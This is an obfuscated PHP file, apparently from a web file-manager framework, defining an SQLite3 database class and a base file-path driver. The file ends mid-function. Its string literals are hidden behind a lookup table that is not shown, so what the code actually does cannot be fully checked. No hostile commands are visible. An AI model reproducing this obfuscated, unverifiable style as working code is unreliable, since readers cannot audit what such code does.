<?php
 goto Eïİƒ‰Ë§; A·«Â”†ù: class DbSqlite3Base extends Db { public function __construct($Bßê®§–¨ = '') { $DÆ©°âÂ” =& $_SERVER[£¶ä½¶¢]; if (!class_exists($DÆ©°âÂ”[61])) { think_exception(think_lang($DÆ©°âÂ”[20]) . $DÆ©°âÂ”[62]); } if (!empty($Bßê®§–¨)) { if (!isset($Bßê®§–¨[$DÆ©°âÂ”[22]])) { $Bßê®§–¨[$DÆ©°âÂ”[22]] = 438; } $this->config = $Bßê®§–¨; if (empty($this->config[$DÆ©°âÂ”[23]])) { $this->config[$DÆ©°âÂ”[23]] = array(); } } } public function connect($cóŒ§ŞÜŠ¹ = '', $c·åĞŒÀî« = 0) { $EÈŒ÷¦ÏÓ =& $_SERVER[£¶ä½¶¢]; if (!isset($this->linkID[$c·åĞŒÀî«])) { if (empty($cóŒ§ŞÜŠ¹)) { $cóŒ§ŞÜŠ¹ = $this->config; } $this->linkID[$c·åĞŒÀî«] = new SQLite3($cóŒ§ŞÜŠ¹[$EÈŒ÷¦ÏÓ[27]]); if (!$this->linkID[$c·åĞŒÀî«]) { think_exception($this->linkID[$c·åĞŒÀî«]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$c·åĞŒÀî«]->busyTimeout(30000); if (1 != think_config($EÈŒ÷¦ÏÓ[28])) { unset($this->config); } } return $this->linkID[$c·åĞŒÀî«]; } public function free() { $this->queryID = null; } public function query($DÒø¦ğåÎ) { goto B¬¶Œ¾ö²; B¬¶Œ¾ö²: $fí‡ˆŠ»…½ =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÚ•¤¥ëù†; AöÜ—ğÀ»ä: if (!1 === $this->queryID) { $this->error(); return !1; } else { $D´Ë†§Ÿƒ³ = $this->getAll(); $this->numRows = count($D´Ë†§Ÿƒ³); return $D´Ë†§Ÿƒ³; } goto d÷÷œêŠâŞ; EÚ•¤¥ëù†: $this->queryStr = $DÒø¦ğåÎ; if ($this->queryID) { $this->free(); } think_action_status($fí‡ˆŠ»…½[29], 1); goto AÄ¾‰¤«µ; AÄ¾‰¤«µ: think_status($fí‡ˆŠ»…½[30]); $this->queryID = $this->_linkID->query($DÒø¦ğåÎ); $this->debug(); goto AöÜ—ğÀ»ä; d÷÷œêŠâŞ: } public function execute($FÔ‰šù¼ª) { goto AË§Šßï´´; D¾¿ÜÓÆ–ö: if (!1 === $f’µ¸„ÙÂ®) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bŠÛª…¤ã; AË§Šßï´´: $aÍøÊÃï­Ä =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D‹÷¼ô‹›‡; D‹÷¼ô‹›‡: $this->queryStr = $FÔ‰šù¼ª; if ($this->queryID) { $this->free(); } think_action_status($aÍøÊÃï­Ä[31], 1); goto e «†ÔŠÃ‹; e «†ÔŠÃ‹: think_status($aÍøÊÃï­Ä[30]); $f’µ¸„ÙÂ® = $this->_linkID->exec($FÔ‰šù¼ª); $this->debug(); goto D¾¿ÜÓÆ–ö; bŠÛª…¤ã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[£¶ä½¶¢][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cëªƒôè÷ = $this->_linkID->query($_SERVER[£¶ä½¶¢][33]); if (!$Cëªƒôè÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cø“Ò‹Ò‘ = $this->_linkID->query($_SERVER[£¶ä½¶¢][34]); if (!$cø“Ò‹Ò‘) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fËÓ¶§Ïë = array(); while ($DÏùÎä®‘ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $fËÓ¶§Ïë[] = $DÏùÎä®‘; } $this->queryID->reset(); return $fËÓ¶§Ïë; } public function getFields($E÷ù‚Ìâ„±) { $Fáìğ™‘™‰ =& $_SERVER[£¶ä½¶¢]; $e£š“ „£Ç = $this->query($Fáìğ™‘™‰[35] . $E÷ù‚Ìâ„± . $Fáìğ™‘™‰[36]); $CÄ†¬Ëİº­ = array(); if ($e£š“ „£Ç) { foreach ($e£š“ „£Ç as $fŞ¤”èÌø‘ => $E£•Ò©óÉ˜) { $CÄ†¬Ëİº­[$E£•Ò©óÉ˜[$Fáìğ™‘™‰[38]]] = array($Fáìğ™‘™‰[38] => $E£•Ò©óÉ˜[$Fáìğ™‘™‰[38]], $Fáìğ™‘™‰[39] => $E£•Ò©óÉ˜[$Fáìğ™‘™‰[39]], $Fáìğ™‘™‰[41] => (bool) ($E£•Ò©óÉ˜[$Fáìğ™‘™‰[41]] === $Fáìğ™‘™‰[43]), $Fáìğ™‘™‰[44] => $E£•Ò©óÉ˜[$Fáìğ™‘™‰[63]], $Fáìğ™‘™‰[46] => (bool) $E£•Ò©óÉ˜[$Fáìğ™‘™‰[64]], $Fáìğ™‘™‰[49] => (bool) $E£•Ò©óÉ˜[$Fáìğ™‘™‰[64]]); } } return $CÄ†¬Ëİº­; } public function getTables($EîŠœÄƒìÓ = '') { $fÙçºƒ¥¤¤ =& $_SERVER[£¶ä½¶¢]; $f†Åµº†‡‚ = $this->query($fÙçºƒ¥¤¤[52] . $fÙçºƒ¥¤¤[53] . $fÙçºƒ¥¤¤[54]); $aĞõ„çÅ­ = array(); foreach ($f†Åµº†‡‚ as $DÆ„Ñ„äÆŠ => $aŒÜÍïØ®İ) { $aĞõ„çÅ­[$DÆ„Ñ„äÆŠ] = current($aŒÜÍïØ®İ); } return $aĞõ„çÅ­; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FÂˆŞ­Üª =& $_SERVER[£¶ä½¶¢]; $this->error = $this->_linkID->lastErrorMsg(); if ($FÂˆŞ­Üª[43] != $this->queryStr) { $this->error .= LNG($FÂˆŞ­Üª[55]) . $this->queryStr; } think_trace($this->error, $FÂˆŞ­Üª[43], $FÂˆŞ­Üª[56]); return $this->error; } public function escapeString($Eªé‘—Òùì) { $dÒ°ˆ§í½Â =& $_SERVER[£¶ä½¶¢]; if ($this->_linkID) { return $this->_linkID->escapeString($Eªé‘—Òùì); } return str_ireplace($dÒ°ˆ§í½Â[65], $dÒ°ˆ§í½Â[66], $Eªé‘—Òùì); } public function parseLimit($f‘¢ŠĞÚÆ‹) { $Fˆù›¯¡ïñ =& $_SERVER[£¶ä½¶¢]; $CÔâ™Ê÷ÌÍ = $Fˆù›¯¡ïñ[43]; if (!empty($f‘¢ŠĞÚÆ‹)) { $f‘¢ŠĞÚÆ‹ = explode($Fˆù›¯¡ïñ[57], $f‘¢ŠĞÚÆ‹); if (count($f‘¢ŠĞÚÆ‹) > 1) { $CÔâ™Ê÷ÌÍ .= $Fˆù›¯¡ïñ[58] . $f‘¢ŠĞÚÆ‹[1] . $Fˆù›¯¡ïñ[59] . $f‘¢ŠĞÚÆ‹[0] . $Fˆù›¯¡ïñ[60]; } else { $CÔâ™Ê÷ÌÍ .= $Fˆù›¯¡ïñ[58] . $f‘¢ŠĞÚÆ‹[0] . $Fˆù›¯¡ïñ[60]; } } return $CÔâ™Ê÷ÌÍ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $E™²àÄíóÑ =& $_SERVER[£¶ä½¶¢]; $this->objectDriver = array($E™²àÄíóÑ[67], $E™²àÄíóÑ[68], $E™²àÄíóÑ[69], $E™²àÄíóÑ[70], $E™²àÄíóÑ[71], $E™²àÄíóÑ[72], $E™²àÄíóÑ[73], $E™²àÄíóÑ[74], $E™²àÄíóÑ[75]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($e¸ÂßÜ²‚˜) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($e¸ÂßÜ²‚˜, $_SERVER[£¶ä½¶¢][18]); } return $e¸ÂßÜ²‚˜; } public function iconvApp($CŒÑë„é†Å) { return $CŒÑë„é†Å; } public function iconvSystem($a„àŸ‡›‚‹) { return $a„àŸ‡›‚‹; } public function iconvTo($b›“–ãÇ‰÷, $CªñÛ—íä, $cÊäÕªÌ) { goto aÅ®­Ğñö; CÜŞ‰ä…ç: $Aøä„œ‰‡ = $CªñÛ—íä . $aÍÎ—ĞêŠÇ[77] . $cÊäÕªÌ . $aÍÎ—ĞêŠÇ[78] . $b›“–ãÇ‰÷; if (isset($Dö®×ê†½ô[$Aøä„œ‰‡])) { return $Dö®×ê†½ô[$Aøä„œ‰‡]; } if (function_exists($aÍÎ—ĞêŠÇ[79])) { $dË öŞË = @mb_convert_encoding($b›“–ãÇ‰÷, $cÊäÕªÌ, $CªñÛ—íä); } else { $dË öŞË = @iconv($CªñÛ—íä, $cÊäÕªÌ, $b›“–ãÇ‰÷); } goto C ä¿Î—¼; aÅ®­Ğñö: $aÍÎ—ĞêŠÇ =& $_SERVER[£¶ä½¶¢]; if (!$b›“–ãÇ‰÷ || !function_exists($aÍÎ—ĞêŠÇ[76])) { return $b›“–ãÇ‰÷; } static $Dö®×ê†½ô = array(); goto CÜŞ‰ä…ç; D“ßÙ„¶Ä¹: return $dË öŞË; goto EÀ‘—§£ó‰; C ä¿Î—¼: $dË öŞË = $dË öŞË ? $dË öŞË : $b›“–ãÇ‰÷; if (strstr($dË öŞË, $aÍÎ—ĞêŠÇ[80])) { $dË öŞË = str_replace($aÍÎ—ĞêŠÇ[80], $aÍÎ—ĞêŠÇ[81], $dË öŞË); } $Dö®×ê†½ô[$CªñÛ—íä . $aÍÎ—ĞêŠÇ[77] . $cÊäÕªÌ . $aÍÎ—ĞêŠÇ[78] . $b›“–ãÇ‰÷] = $dË öŞË; goto Dğø¼¨Æ; Dğø¼¨Æ: $Dö®×ê†½ô[$cÊäÕªÌ . $aÍÎ—ĞêŠÇ[77] . $CªñÛ—íä . $aÍÎ—ĞêŠÇ[78] . $b›“–ãÇ‰÷] = $b›“–ãÇ‰÷; $Dö®×ê†½ô[$cÊäÕªÌ . $aÍÎ—ĞêŠÇ[77] . $CªñÛ—íä . $aÍÎ—ĞêŠÇ[78] . $dË öŞË] = $b›“–ãÇ‰÷; $Dö®×ê†½ô[$CªñÛ—íä . $aÍÎ—ĞêŠÇ[77] . $cÊäÕªÌ . $aÍÎ—ĞêŠÇ[78] . $dË öŞË] = $dË öŞË; goto D“ßÙ„¶Ä¹; EÀ‘—§£ó‰: } public function getPathInner($fñ¸ìÎ¡’‚) { $C‹•ªƒôµ± = IO::init($fñ¸ìÎ¡’‚); return $C‹•ªƒôµ±->path; } public function getPathOuter($Dõ¤°±Ÿ™¾) { $b¼ë¹ñõ›ˆ =& $_SERVER[£¶ä½¶¢]; $AƒšßºÍ· = strlen(trim($this->pathBase, $b¼ë¹ñõ›ˆ[18])); $Dõ¤°±Ÿ™¾ = substr(trim($Dõ¤°±Ÿ™¾, $b¼ë¹ñõ›ˆ[18]), $AƒšßºÍ·); return $this->pathDriver . $b¼ë¹ñõ›ˆ[18] . ltrim($Dõ¤°±Ÿ™¾, $b¼ë¹ñõ›ˆ[18]); } public function isParentOf($eùœ±ÚÙß…, $C›„ê¼Ê×ù) { $dÍí“™Æõ½ =& $_SERVER[£¶ä½¶¢]; $eùœ±ÚÙß… = rtrim(strtolower($eùœ±ÚÙß…), $dÍí“™Æõ½[18]) . $dÍí“™Æõ½[18]; $C›„ê¼Ê×ù = rtrim(strtolower($C›„ê¼Ê×ù), $dÍí“™Æõ½[18]) . $dÍí“™Æõ½[18]; $eóƒµØ†ÁÌ = strpos($C›„ê¼Ê×ù, $eùœ±ÚÙß…) === 0; return $eóƒµØ†ÁÌ; } public function getType() { $A©Î»¢¶á =& $_SERVER[£¶ä½¶¢]; $fß×¦Ğ–Äƒ = str_replace($A©Î»¢¶á[82], $A©Î»¢¶á[43], get_class($this)); return strtolower($fß×¦Ğ–Äƒ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fÀÔ®÷èáÒ, $cö±ÛÈ‰–©) { $E‹åç™İ¯µ =& $_SERVER[£¶ä½¶¢]; $B¦ÑÁÉâ²ê = rtrim($fÀÔ®÷èáÒ, $E‹åç™İ¯µ[18]) . $E‹åç™İ¯µ[18] . $cö±ÛÈ‰–©; $c”ÖÑŒ¶²Ó = $this->exist($B¦ÑÁÉâ²ê); return $c”ÖÑŒ¶²Ó ? $B¦ÑÁÉâ²ê : !1; } public function setModifyTime($e‚Ö˜óøŠ–, $BŠî—ï³ = '') { } public function renameObject($F¬Ñ èÅ©, $D¹š™³”Æ) { goto bË©‰ÔäÈ; E¦Ø¦…ªÛÀ: $F¬Ñ èÅ© = $this->getPathOuter($F¬Ñ èÅ©); $D¹š™³”Æ = $this->pathFather($F¬Ñ èÅ©) . $D¹š™³”Æ; if (IO::isFile($F¬Ñ èÅ©)) { $f¶ğïõ‚÷ = IO::copy($F¬Ñ èÅ©, $this->pathFather($F¬Ñ èÅ©), REPEAT_RENAME_FOLDER, $F¥ª‰Ù¹ÓĞ); if ($f¶ğïõ‚÷) { IO::remove($F¬Ñ èÅ©); } } else { $f¶ğïõ‚÷ = IO::mkdir($D¹š™³”Æ); if (!$f¶ğïõ‚÷) { return !1; } $c‹‚Ã²ªã = IO::listPath($F¬Ñ èÅ©, !0); $Bïë¡ÇöÙ = array_merge($c‹‚Ã²ªã[$aÙĞÑ‰šÅÔ[84]], $c‹‚Ã²ªã[$aÙĞÑ‰šÅÔ[85]]); foreach ($Bïë¡ÇöÙ as $FŠ¸çô ‡) { IO::move($FŠ¸çô ‡[$aÙĞÑ‰šÅÔ[86]], $D¹š™³”Æ, REPEAT_RENAME_FOLDER); } IO::remove($F¬Ñ èÅ©); } goto D™éê‚š–¤; D™éê‚š–¤: return $f¶ğïõ‚÷ ? $D¹š™³”Æ : !1; goto eßÛˆ£Ù«; bË©‰ÔäÈ: $aÙĞÑ‰šÅÔ =& $_SERVER[£¶ä½¶¢]; $F¥ª‰Ù¹ÓĞ = $D¹š™³”Æ; Hook::trigger($aÙĞÑ‰šÅÔ[83], $this, $F¬Ñ èÅ©, $this, $this->pathFather($F¬Ñ èÅ©) . $D¹š™³”Æ); goto E¦Ø¦…ªÛÀ; eßÛˆ£Ù«: } public function tempFile($BïÃ–— É‡ = '', $a„™ÛÅ¤êİ = '') { goto a»Œì‰ˆˆ¨; A¬í±©È¹: $B†©èÀˆ† = $F˜¦•²»¢â . $BïÃ–— É‡; @touch($B†©èÀˆ†); if ($a„™ÛÅ¤êİ) { file_put_contents($B†©èÀˆ†, $a„™ÛÅ¤êİ); } goto cæ¹‚æÛ”¯; a»Œì‰ˆˆ¨: if (!$BïÃ–— É‡) { $BïÃ–— É‡ = rand_string(15); } $F˜¦•²»¢â = TEMP_FILES . rand_string(15) . $_SERVER[£¶ä½¶¢][18]; @mkdir($F˜¦•²»¢â, 511, !0); goto A¬í±©È¹; cæ¹‚æÛ”¯: return $B†©èÀˆ†; goto C‹“ÛÊ’; C‹“ÛÊ’: } public function tempFileRemve($F„«İ×ƒï…) { @unlink($F„«İ×ƒï…); @rmdir($this->pathFather($F„«İ×ƒï…)); } public function mkfile($eÖ£ïÆ‘×ˆ, $aíÉ‚ß…œ“ = '', $c¾³›é×ñ = REPEAT_RENAME) { } public function mkdir($b˜›ˆÂÃ‰, $DÃñÒ¥Ã®Ñ = REPEAT_SKIP) { } public function delFile($dó“ˆõèğÀ) { } public function delFolder($Eºç’Ü«¬») { } public function copyFile($dª¦¯ªß°», $EÈçõÓ¹Ù«) { } public function moveFile($e›ÆïæÑ­, $B†İ©‘¬”) { } public function remove($b†„ƒãé–¢) { if ($this->isFile($b†„ƒãé–¢)) { return $this->delFile($b†„ƒãé–¢); } return $this->delFolder($b†„ƒãé–¢); } public function rename($E¯ˆéåğ, $b¥ŞÛá”•³) { } public function exist($a´‡ĞôÍŒ) { } public function findByHash($CøÕéÛÇÈ† = '', $eòó‘Ë¥ĞÙ = '') { return !1; } public function isFile($fÙ¼óİïÌŞ) { } public function isFolder($b‚©ã²Š¤¹) { } public function size($D±×ÍÒÓ“ğ) { } public function info($eÓÛ‘ë‘İ) { } public function infoSimple($dê¹Œ¼ø”È) { return $this->info($dê¹Œ¼ø”È); } public function infoAuth($C‚‘ˆ§Ä) { return $this->info($C‚‘ˆ§Ä); } public function infoFull($FŠ°—³Œ‹×) { return $this->info($FŠ°—³Œ‹×); } public function infoWithChildren($dß‚š¢ííæ) { $Cì™šŒÂ…Ô =& $_SERVER[£¶ä½¶¢]; static $Bø“ÅÀ‰ƒÂ = array(); if (isset($Bø“ÅÀ‰ƒÂ[$dß‚š¢ííæ])) { return $Bø“ÅÀ‰ƒÂ[$dß‚š¢ííæ]; } $dÓ¢…ã†Ú = $this->info($dß‚š¢ííæ); if ($dÓ¢…ã†Ú && $dÓ¢…ã†Ú[$Cì™šŒÂ…Ô[39]] == $Cì™šŒÂ…Ô[87]) { $aøİÖõçÁ = array($Cì™šŒÂ…Ô[88] => 0, $Cì™šŒÂ…Ô[89] => 0, $Cì™šŒÂ…Ô[90] => 0); $this->infoChildren($dß‚š¢ííæ, $aøİÖõçÁ); $dÓ¢…ã†Ú[$Cì™šŒÂ…Ô[88]] = $aøİÖõçÁ[$Cì™šŒÂ…Ô[88]]; $dÓ¢…ã†Ú[$Cì™šŒÂ…Ô[91]] = array($Cì™šŒÂ…Ô[92] => $aøİÖõçÁ[$Cì™šŒÂ…Ô[89]], $Cì™šŒÂ…Ô[93] => $aøİÖõçÁ[$Cì™šŒÂ…Ô[90]]); $Bø“ÅÀ‰ƒÂ[$dß‚š¢ííæ] = $dÓ¢…ã†Ú; } return $dÓ¢…ã†Ú; } public function listPath($aø°›»²œî, $cÎšñÉñÃ = false) { } public function has($Fó–Ëä³¡, $D®àöã¶¾‰ = false, $B–”²ÕæÖÖ = false) { } public function canRead($AáòÚ¸ñ‹ó) { } public function canWrite($b¸†éªÙ¿í) { } public function getContent($Då¢¹ë‘µÔ) { } public function setContent($Dˆ·¡æº¶, $b†¥™‘‘Êˆ = '') { } protected function infoChildren($aÁ‚¢ˆ¤İ¾, &$fÆÌ—ÛƒŞ) { $AÄß±ÛÌå =& $_SERVER[£¶ä½¶¢]; check_abort_echo(); $Cæ´óÕƒŠ® = $this->listPath($aÁ‚¢ˆ¤İ¾, !0); $Cæ´óÕƒŠ® = array_merge($Cæ´óÕƒŠ®[$AÄß±ÛÌå[85]], $Cæ´óÕƒŠ®[$AÄß±ÛÌå[84]]); foreach ($Cæ´óÕƒŠ® as $aöÄ™ãà”) { if ($aöÄ™ãà”[$AÄß±ÛÌå[39]] == $AÄß±ÛÌå[87]) { $fÆÌ—ÛƒŞ[$AÄß±ÛÌå[90]]++; $CÈ˜„ÀÓ¦Š = $this->getPathInner($aöÄ™ãà”[$AÄß±ÛÌå[86]]); $this->infoChildren($CÈ˜„ÀÓ¦Š, $fÆÌ—ÛƒŞ); } else { $fÆÌ—ÛƒŞ[$AÄß±ÛÌå[89]]++; $fÆÌ—ÛƒŞ[$AÄß±ÛÌå[88]] += $aöÄ™ãà”[$AÄß±ÛÌå[88]]; } } } public function fileSubstr($aİÏ÷á‚ßÓ, $fïîİ×¢ˆ÷, $cŸ©’¢—) { } public function listAll($cº¹¡¸–Í¸) { } public function listAllMake($E£™ÖÌ‰¼â, &$C‰›¶¿è½) { $C±¶Ø†‡ï— =& $_SERVER[£¶ä½¶¢]; check_abort_echo(); $DïµÖß»– = $this->listPath($E£™ÖÌ‰¼â, !0); if (!$DïµÖß»–) { return; } $BêÙšÃÏß = array_merge($DïµÖß»–[$C±¶Ø†‡ï—[85]], $DïµÖß»–[$C±¶Ø†‡ï—[84]]); foreach ($BêÙšÃÏß as $aŒ‹Íµ¯ÓŠ) { goto cƒ»âö÷„ù; cƒ»âö÷„ù: $DèÇ©ŠÁ± = $aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[39]] == $C±¶Ø†‡ï—[87]; $DŸçº¦î‚Ÿ = array($C±¶Ø†‡ï—[86] => $aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[86]], $C±¶Ø†‡ï—[87] => $DèÇ©ŠÁ±); if (isset($aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[88]])) { $DŸçº¦î‚Ÿ[$C±¶Ø†‡ï—[88]] = $aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[88]]; } goto a™Í—ÛÅ¨; c¹Š¹¨Ö³: $this->listAllMake($aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[86]], $C‰›¶¿è½); goto a˜î ¤èÆ; a™Í—ÛÅ¨: if (isset($aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[94]])) { $DŸçº¦î‚Ÿ[$C±¶Ø†‡ï—[94]] = $aŒ‹Íµ¯ÓŠ[$C±¶Ø†‡ï—[94]]; } if (!$DèÇ©ŠÁ±) { $C‰›¶¿è½[] = $DŸçº¦î‚Ÿ; continue; } $C‰›¶¿è½[] = $DŸçº¦î‚Ÿ; goto c¹Š¹¨Ö³; a˜î ¤èÆ: } } public function listAllSimple($Fù²®½) { $e¢ŸÚ¿—Ó² =& $_SERVER[£¶ä½¶¢]; $B°Œ„ÛèŞß = array(); $Aå°Ìƒ˜¶› = $this->listAll($Fù²®½); $DœÉ¹óİ»› = $this->getPathOuter($Fù²®½); foreach ($Aå°Ìƒ˜¶› as $dœËİ£‘‰Ú) { goto eôğ‹§ğÇ; eôğ‹§ğÇ: $fñÜ¡ÃƒÜ§ = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[86]]; $FêÜÀ­Å†Ü = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[86]]; if (isset($dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[95]])) { $fñÜ¡ÃƒÜ§ = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[95]][$e¢ŸÚ¿—Ó²[86]]; $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[88]] = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[95]][$e¢ŸÚ¿—Ó²[88]]; $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[94]] = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[95]][$e¢ŸÚ¿—Ó²[94]]; } else { $FêÜÀ­Å†Ü = substr($dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[86]], strlen(get_path_father($DœÉ¹óİ»›))); $FêÜÀ­Å†Ü = $e¢ŸÚ¿—Ó²[18] . ltrim($FêÜÀ­Å†Ü, $e¢ŸÚ¿—Ó²[18]); } goto dó÷•©¿Ü®; dó÷•©¿Ü®: $bŒ‚²í¢àŠ = array($e¢ŸÚ¿—Ó²[86] => $FêÜÀ­Å†Ü, $e¢ŸÚ¿—Ó²[87] => $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[87]]); if (isset($dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[88]]) && !$dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[87]]) { $bŒ‚²í¢àŠ[$e¢ŸÚ¿—Ó²[88]] = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[88]]; } if (isset($dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[94]])) { $bŒ‚²í¢àŠ[$e¢ŸÚ¿—Ó²[94]] = $dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[94]]; } goto EÃ„È¤½ù®; EÃ„È¤½ù®: if (!$dœËİ£‘‰Ú[$e¢ŸÚ¿—Ó²[87]]) { $bŒ‚²í¢àŠ[$e¢ŸÚ¿—Ó²[96]] = $fñÜ¡ÃƒÜ§; } $B°Œ„ÛèŞß[] = $bŒ‚²í¢àŠ; goto ešçœ¤‡÷©; ešçœ¤‡÷©: } return $B°Œ„ÛèŞß; } public function upload($c‘É™ÇóğÅ, $BÏŸ™•ÊÓ¾, $Fá¸ç¨­ÀÅ = false, $fÆŠİÀñ»à = REPEAT_REPLACE) { } public function uploadFileByID($A¥Í‰Ú©„°, $a„¶§æÓÅà, $F‹™µ¦”ƒØ) { } public function uploadFileByPath($C—ƒÛÅíÒô, $E‰Âˆ®¡, $CŒ“È’‰· = array()) { } public function isUploadServer() { $f¹÷©¶†Â =& $_SERVER[£¶ä½¶¢]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $f¹÷©¶†Â[97]) { return !0; } return $GLOBALS[$f¹÷©¶†Â[16]][$f¹÷©¶†Â[98]][$f¹÷©¶†Â[99]]; } public function isFileOutServer() { $E¨é±Ê ôò =& $_SERVER[£¶ä½¶¢]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $E¨é±Ê ôò[97]) { return !0; } return $GLOBALS[$E¨é±Ê ôò[16]][$E¨é±Ê ôò[98]][$E¨é±Ê ôò[100]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F¾ºèÌ’³„) { $d˜§ôùøÀÂ =& $_SERVER[£¶ä½¶¢]; if (!$this->isCdnHost()) { return $F¾ºèÌ’³„; } return str_replace(trim(get_url_root($F¾ºèÌ’³„), $d˜§ôùøÀÂ[18]), trim($this->cdnHost, $d˜§ôùøÀÂ[18]), $F¾ºèÌ’³„); } public function uploadLink($f¢¡”â¥òå, $CÄ‘‹è¸Ô„ = 0) { goto B¡ÚøÀÒÒô; d‹“ĞÓÚ‹…: $DôìÕ­·ÀÕ = $CÄ‘‹è¸Ô„ <= $aÛÛ¦„°¼Û ? $EÉôß«¨»[101] : $EÉôß«¨»[102]; $dÂç˜íÒÎ = (!$CÄ‘‹è¸Ô„ ? 1 : ceil($CÄ‘‹è¸Ô„ / pow(1024, 3))) * 3600 * 4; $FîŒä¬ù‹É = $this->{$DôìÕ­·ÀÕ}($f¢¡”â¥òå, $dÂç˜íÒÎ); goto C›‘Æ…Ğ§¬; C›‘Æ…Ğ§¬: if ($FîŒä¬ù‹É) { $FîŒä¬ù‹É[$EÉôß«¨»[103]] = $f¢¡”â¥òå; $FîŒä¬ù‹É[$EÉôß«¨»[104]] = $eàÎ»Ó¹ÚÂ; } return $FîŒä¬ù‹É; goto cã¦ß‹’‘«; FÄ†¸¤Ø‰ª: if (!in_array($eàÎ»Ó¹ÚÂ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $aÛÛ¦„°¼Û = 1024 * 1024 * 10; goto d‹“ĞÓÚ‹…; B¡ÚøÀÒÒô: $EÉôß«¨» =& $_SERVER[£¶ä½¶¢]; if ($this->isUploadServer()) { return; } $eàÎ»Ó¹ÚÂ = $this->getType(); goto FÄ†¸¤Ø‰ª; cã¦ß‹’‘«: } public function uploadFormData($dˆ˜ŸŞÔ¢Ï, $EÏ«¸ºİ© = 3600) { } public function multiUploadFormData($aŒî¾±“·…, $a‹ˆ–ƒÏò = 3600) { } public function download($E²Ï¡ÍìÄµ, $dÛ‘§ì) { } public function ext($D…•¸ñÀÕé) { $Dİé… =& $_SERVER[£¶ä½¶¢]; if (strpos($D…•¸ñÀÕé, $Dİé…[18]) === -1) { $bóÏù£ïä = $D…•¸ñÀÕé; } else { $bóÏù£ïä = $this->pathThis($D…•¸ñÀÕé); } $FÖµš™•òà = $Dİé…[43]; if (strstr($bóÏù£ïä, $Dİé…[105])) { $FÖµš™•òà = substr($bóÏù£ïä, strrpos($bóÏù£ïä, $Dİé…[105]) + 1); $FÖµš™•òà = strtolower($FÖµš™•òà); } if (strlen($FÖµš™•òà) > 3 && preg_match($Dİé…[106], $FÖµš™•òà, $FŞ³è½Ÿİ)) { $FÖµš™•òà = $Dİé…[43]; } return $FÖµš™•òà; } public function pathThis($fšçîğ‚©‡) { $cÒ–ÑÆ•ò… =& $_SERVER[£¶ä½¶¢]; $fšçîğ‚©‡ = str_replace($cÒ–ÑÆ•ò…[107], $cÒ–ÑÆ•ò…[18], rtrim($fšçîğ‚©‡, $cÒ–ÑÆ•ò…[18])); $d‘›É¶ŞÁ… = strrpos($fšçîğ‚©‡, $cÒ–ÑÆ•ò…[18]); if ($d‘›É¶ŞÁ… === !1) { return $fšçîğ‚©‡; } return substr($fšçîğ‚©‡, $d‘›É¶ŞÁ… + 1); } public function pathFather($bªŒì‰âÄÖ) { $cªŠªÎğö =& $_SERVER[£¶ä½¶¢]; $bªŒì‰âÄÖ = str_replace($cªŠªÎğö[107], $cªŠªÎğö[18], rtrim($bªŒì‰âÄÖ, $cªŠªÎğö[18])); $cù¼íÍÎé¶ = strrpos($bªŒì‰âÄÖ, $cªŠªÎğö[18]); if ($cù¼íÍÎé¶ === !1) { return $cªŠªÎğö[43]; } return substr($bªŒì‰âÄÖ, 0, $cù¼íÍÎé¶ + 1); } public function hashSimple($ešØÂ…°Œ™) { goto eé…İÈö°è; A×ÎÆÈéóå: $FˆŠ©ÏÎìê .= $this->fileSubstr($ešØÂ…°Œ™, $e¼Ç‘ÜÆ¼ - $B…³›ø‚ÊÍ, $B…³›ø‚ÊÍ); return md5($FˆŠ©ÏÎìê) . $e¼Ç‘ÜÆ¼; goto fƒ‘åôŞñ; Cš™šƒ±ĞÉ: $B…³›ø‚ÊÍ = 200; $B¶™Èæ£ÜÁ = 50; if ($e¼Ç‘ÜÆ¼ <= $B…³›ø‚ÊÍ * $B¶™Èæ£ÜÁ) { return $this->hashMd5($ešØÂ…°Œ™) . $e¼Ç‘ÜÆ¼; } goto e‡İõÇŠ¤Ò; 